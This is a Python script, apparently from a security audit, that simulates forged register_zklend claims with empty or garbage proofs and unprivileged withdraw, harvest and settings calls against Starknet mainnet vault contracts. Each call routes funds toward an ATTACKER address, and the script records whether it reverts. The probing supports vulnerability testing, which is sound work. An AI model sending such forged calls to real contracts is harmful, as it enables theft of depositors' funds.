#!/usr/bin/env python3
"""Final probes: register_zklend forgery test + remaining gates (stable senders)."""
import json

from rpc import felt, selector

from simulate_extended import (
    AC_STRK, AC_USDC, S_STRK, S_USDC,
    ATTACKER, AC_OWNER, S_OWNER, STRK, USDC, ETH, enc_swap, simulate, u256,
)

CARTRIDGE = "https://api.cartridge.gg/x/starknet/mainnet"


def norm_sel(s):
    return "0x" + format(int(s, 16), "064x") if s else ""


def analyze2(sim):
    trace = sim.get("transaction_trace", {})
    ex = trace.get("execute_invocation", {})
    if ex.get("revert_reason"):
        return {"status": "REVERTED", "revert": str(ex["revert_reason"])[:1500]}
    lines = []

    def walk(node, d=0):
        if not isinstance(node, dict):
            return
        lines.append({"depth": d, "selector": norm_sel(node.get("entry_point_selector", "")),
                      "contract": node.get("contract_address", ""), "calldata": node.get("calldata", [])})
        for c in node.get("calls", []) or []:
            walk(c, d + 1)

    walk(ex)
    trf = [l for l in lines if l["selector"] == norm_sel(selector("transfer"))]
    return {"status": "SUCCESS", "n_calls": len(lines), "transfers": trf, "calls": lines[:30]}


def enc_claim_context(recipient, share, withdrawable, proof):
    cd = [felt(recipient), hex(share), hex(len(withdrawable))]
    for token, amount in withdrawable:
        cd += [felt(token), hex(amount)]
    cd += [hex(len(proof))] + [felt(p) for p in proof]
    return cd


def main():
    results = {}
    swap = enc_swap(STRK, 10**18, USDC, 0, 0, ATTACKER, 0, "0x0", [])
    plan = [
        # register_zklend forgery attempts (unprivileged sender = the other vaults' owner)
        ("AC_STRK register_zklend(forged,empty proof)", AC_STRK, "register_zklend",
         [*enc_claim_context(ATTACKER, 0, [], [])], S_OWNER),
        ("AC_STRK register_zklend(forged,huge,empty proof)", AC_STRK, "register_zklend",
         [*enc_claim_context(ATTACKER, 10**18, [(USDC, 10**12)], [])], S_OWNER),
        ("AC_STRK register_zklend(forged,garbage proof)", AC_STRK, "register_zklend",
         [*enc_claim_context(ATTACKER, 10**18, [(USDC, 10**12)], ["0x1", "0x2"])], S_OWNER),
        ("S_USDC register_zklend(forged,empty proof)", S_USDC, "register_zklend",
         [*enc_claim_context(ATTACKER, 10**18, [(USDC, 10**12)], [])], AC_OWNER),
        # remaining gates with stable senders
        ("S_USDC withdraw(1,attacker,0) from AC_owner", S_USDC, "withdraw", [hex(1), hex(0), felt(ATTACKER), hex(0)], AC_OWNER),
        ("S_USDC rebalance(1,false) from AC_owner", S_USDC, "rebalance", [hex(1), hex(0), hex(0)], AC_OWNER),
        ("S_USDC locked(0,[]) from AC_owner", S_USDC, "locked", [hex(0), hex(0)], AC_OWNER),
        ("AC_STRK harvest(dummy) from S_owner", AC_STRK, "harvest", [hex(0), felt(AC_STRK), hex(0), hex(0), *swap], S_OWNER),
        ("AC_STRK claim_zklend(1,USDC,1) from S_owner", AC_STRK, "claim_zklend", [hex(1), hex(0), felt(USDC), hex(1), hex(0)], S_OWNER),
        ("AC_STRK set_settings from S_owner", AC_STRK, "set_settings", [hex(0), hex(0), hex(0), hex(0)], S_OWNER),
    ]
    for item in plan:
        label, vault, entry, args = item[0], item[1], item[2], item[3]
        sender = item[4]
        try:
            r = simulate(sender, [(vault, entry, args)])
            results[label] = analyze2(r[0])
        except Exception as e:  # noqa: BLE001
            results[label] = {"status": "SIM_ERROR", "error": str(e)[:300]}
    print(json.dumps(results, indent=1))


if __name__ == "__main__":
    main()
